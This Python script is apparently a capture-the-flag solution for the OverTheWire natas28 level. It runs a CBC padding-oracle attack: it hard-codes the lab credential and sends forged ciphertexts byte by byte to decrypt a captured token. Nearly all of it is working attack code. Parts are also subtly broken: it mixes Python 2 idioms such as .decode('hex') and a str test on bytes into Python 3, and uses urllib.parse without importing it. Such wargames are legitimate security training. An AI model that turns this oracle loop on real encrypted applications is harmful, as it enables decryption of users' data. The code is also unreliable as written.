#!/usr/local/bin/python3


import requests,sys,base64,urllib,binascii


url = 'http://natas28.natas.labs.overthewire.org/search.php/?query='
cred = ('natas28', 'JWwR438wkgTsNKBbcJoowyysdM82YjeF')
prx = {
  'http': 'http://127.0.0.1:8080',
  'https': 'http://127.0.0.1:8080',
}

block_size = 8

encrypted_msg_url_enc = "G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKE9SKvZSEUa2%2BrnfDhhPN6mi4rXbbzHxmhT3Vnjq2qkEJJuT5N6gkJR5mVucRLNRo%3D"
print(encrypted_msg_url_enc)
encrypted_msg_base64 = urllib.parse.unquote(encrypted_msg_url_enc)
encrypted_msg_ascii = base64.b64decode(encrypted_msg_base64)
print(binascii.hexlify(encrypted_msg_ascii))

encrypted_msg = binascii.hexlify(encrypted_msg_ascii)
n=0
enc_msg_list = []

def xor_hex_str(str1,str2):
    assert len(str1)==len(str2)
    str1_hex = int(str1, 16)
    str2_hex = int(str2, 16)
    return str(format(str1_hex ^ str2_hex, '02x'))

def encode_payload(pld):
    payload_ascii = binascii.unhexlify(pld)
    payload_base64 = base64.b64encode(payload_ascii)
    return urllib.parse.quote(payload_base64, safe ='')

def assemble_payload(index,modified_prev_block):
    payload = ""
    for i in range(0,index+1):
        if i == index-1:
            payload+=modified_prev_block
            continue
        payload+=enc_msg_list[i]
    return payload


#block is string in hex format XX without leading 0x
def divide_block_to_bytes(block):
    n = 2 #two chars for each byte
    print("Dividing block " + block)
    block_byte_list = [block[i:i+n] for i in range (0, len(block), n)]
    return block_byte_list


def apply_padding_xor(byte_list, pad_size):
    xored_byte_list = byte_list[:-pad_size]
    print("DEBUG: Applying padding to block:", byte_list)
    print("DEBUG: Padding size:", pad_size)
    pad_size_str = str(format(pad_size, '02x')) #convert padding byte to string
    print("DEBUG: Padding in hex: " + pad_size_str)
    print("DEBUG: Applying padding to last", pad_size, "bytes only:", byte_list[-pad_size:])
    for byte in byte_list[-pad_size:]:
        xored_byte_list.append(xor_hex_str(byte, pad_size_str))
    return xored_byte_list



def xor_guess_and_guessed_bytes(g, ind, pad_prev_block, guessed_block):
    guess_xored_list = pad_prev_block[:]
    print("DEBUG: XOR with guess", g, "on position", ind, "to padded block", pad_prev_block)
    guess_xored_list[ind] = xor_hex_str(g, pad_prev_block[ind])
    print("DEBUG: Result after guess applied:", guess_xored_list)
    print("DEBUG: XOR with previously guessed ", guessed_block)
    assert len(guessed_block) == len(guess_xored_list)
    payload_block_list = []
    for i in range(0,len(guess_xored_list)):
        #print "DEBUG: XOR", guess_xored_list[i], guessed_block[i]
        payload_block_list.append(xor_hex_str(guess_xored_list[i],guessed_block[i]))
    #print "DEBUG: final result:", payload_block_list
    return payload_block_list


#divide msg by blocks and put blocks to list
while n < len(encrypted_msg):
    enc_msg_list.append(encrypted_msg[n:n+block_size*2])
    n+=block_size*2
print(enc_msg_list)





guessed_blocks_list_reverse = []
# #iterating by block from last to first, index - actual index in block list
for index,enc_block in reversed(list(enumerate(enc_msg_list))):
    if index == 0:
        print("DEBUG: This is IV block")
        print("DEBUG: " + enc_block)

    else:
        print("Guessing block number " + str(index+1) + ": " + enc_block)
        #divide previous block to bytes
        guessed_block = ["00"] * block_size # initialize guessed_block with all bytes = x00
        prev_block = enc_msg_list[index-1]
        prev_block_list=divide_block_to_bytes(prev_block)
        print("DEBUG: Previous block list: ", prev_block_list)
        #iterate from last byte to first in previous block
        for byte_index in range(block_size-1, -1, -1):
            padding_size = block_size - byte_index #padding size depends on iteration number: 0x01, 0x0202, 0x030303, etc
            #print prev_block_list[byte_index:]
            padded_prev_block = apply_padding_xor(prev_block_list, padding_size)
            print("DEBUG: Prev block with applied padding:", padded_prev_block)
            print("====================================================")
            #guessing byte with index byte_index
            for guess in range(0,256):
                prev_block_payload_list = xor_guess_and_guessed_bytes(str(format(guess, '02x')), byte_index, padded_prev_block, guessed_block)
                #convert prev_block_payload_list to string
                prev_block_payload = ""
                for byte in prev_block_payload_list:
                    prev_block_payload+=byte
                #print "DEBUG: String payload block:", prev_block_payload
                payload = assemble_payload(index,prev_block_payload)
                print("DEBUG: Full payload:",payload)
                print("DEBUG: Encoded_payload",encode_payload(payload))
                r = requests.get(url + encode_payload(payload), auth = cred, proxies=prx)
                print("DEBUG: STATUS CODE:", r.status_code)
                if r.status_code == 200:
                    candidate_guess = str(format(guess, '02x'))
                if "Whack" in r.content:
                    guessed_block[byte_index] = str(format(guess, '02x'))
                    print("\n================DEBUG: GUESSED byte",guessed_block,"\n====================")
                    break
                if guess == 255: # last iteration, no 404 were observed, going with candidate guess
                    guessed_block[byte_index] = candidate_guess
                    print("\n================DEBUG: NO 404 CODE, USED CANDIDATE GUESS, GUESSED byte",guessed_block,"\n====================")

        guessed_blocks_list_reverse.append(guessed_block)
        print("RESULT SO FAR:", guessed_blocks_list_reverse)

guessed_blocks_list_reverse.reverse()

print("ANSWER in hex:", guessed_blocks_list_reverse)

ans_string = ""
for block in guessed_blocks_list_reverse:
    for byte in block:
        ans_string+=byte

print("ANSWER in ASCII:", ans_string.decode('hex'))
